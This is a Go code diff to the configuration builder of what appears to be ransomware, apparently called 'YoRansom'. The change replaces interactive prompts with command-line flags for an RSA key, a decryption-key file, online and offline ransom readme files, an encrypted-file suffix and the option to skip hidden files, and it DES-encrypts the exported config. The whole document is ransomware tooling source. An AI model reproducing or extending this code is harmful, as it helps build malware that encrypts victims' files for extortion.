@@ -14,18 +14,13 @@ import (
 	"crypto/des"
 	"encoding/base64"
 	"io/ioutil"
+	"flag"
 )
 
 func main() {
-	// Check Args
-	if len(os.Args) != 2 {
-		fmt.Println("Usage: ", os.Args[0], "<DES key(8 bytes)>")
-		return
-	}
-	if len(os.Args[1]) != 8 {
-		fmt.Println("[Error] Wrong DES key.")
-		return
-	}
+	// Set Args
+	skipHidden := flag.Bool("SkipHidden", true, "Skip hidden file? (For windows only) (Y/N)")
+	desKey := flag.String("desKey", "YoRansom", "DES Key to encrypt config data")
 
 	// Set configs
 	N, E := GenRsaKey(1024)
@@ -35,31 +30,27 @@ func main() {
 		"DkeyFilename": "Filename to store key file for decrypt",
 		"ReadmeUrl":    "URL of ONLINE readme file(keep blank to disable)", "ReadmeNetFilename": "Filename of ONLINE readme file(if enabled)",
 		"Readme":       "Content of OFFLINE readme file(ONE line)", "ReadmeFilename": "Filename of OFFLINE readme file",
-		"EncSuffix":    "Suffix to be added to the end of encrypted files(Include dot)"}
+		"Filesuffix":    "Suffix to be added to the end of encrypted files(Include dot)", }
+	argDict := map[string]*string{}
 	for key, q := range questionDict {
-		var input string
-		fmt.Println("Enter your", q)
-		fmt.Scan(&input)
-		reflect.ValueOf(&conf).Elem().FieldByName(key).SetString(input)
+		argDict[key] = flag.String(key, "", q)
 	}
-	fmt.Println("Do you want to skip hidden file? (For windows only) (Y/N)")
-Loop:
-	for {
-		var input string
-		fmt.Scan(&input)
-		switch input {
-		case "Y", "y":
-			conf.SkipHidden = true
-			break Loop
-		case "N", "n":
-			conf.SkipHidden = false
-			break Loop
-		}
+	flag.Parse()
+	if len(os.Args) != 9{
+		flag.Usage()
+		return
 	}
+	for key, q := range argDict {
+		reflect.ValueOf(&conf).Elem().FieldByName(key).SetString(*q)
+	}
+
+	conf.SkipHidden = *skipHidden
+
+	conf.check()
 
 	// Encrypt JSON data
 	data := conf.export()
-	cip, _ := des.NewCipher([]byte(os.Args[1]))
+	cip, _ := des.NewCipher([]byte(*desKey))
 	for offset := 0; len(data)-offset > 8; offset += 8 {
 		cip.Encrypt(data[offset:offset+8], data[offset:offset+8])
 	}
